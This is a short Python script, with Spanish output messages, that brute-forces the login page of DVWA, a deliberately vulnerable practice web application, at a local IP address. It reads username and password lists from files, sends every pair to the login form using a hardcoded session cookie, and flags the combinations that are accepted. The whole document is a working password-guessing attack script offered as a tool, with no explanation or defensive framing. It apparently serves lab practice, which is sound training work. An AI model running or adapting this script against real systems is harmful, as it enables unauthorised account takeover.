#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Autor:
import sys
import requests
from termcolor import colored, cprint
cookie = {"PHPSESSID": "qk9e71ier8vi62jumounl7jidf",
          "security":"low"}

def file_read(file):
       with open(file,mode='r',encoding='utf-8') as file_text:
              return file_text.read()
    
user = file_read("user.txt").split("\n")
password = file_read("password.txt").split("\n")
 

for i in user:
    for j in password:
        url = f"http://192.168.1.142/dvwa/vulnerabilities/brute/?username={i}&password={j}&Login=Login#"
        response = requests.get(url,cookies=cookie)

        if not "Username and/or password incorrect." in response.text:
              cprint(f"[+] {i}:{j} es valido", "green", attrs=["bold"], file=sys.stderr)
        else:
              cprint(f"[-] {i}:{j} no es valido", "red", attrs=["bold"], file=sys.stderr)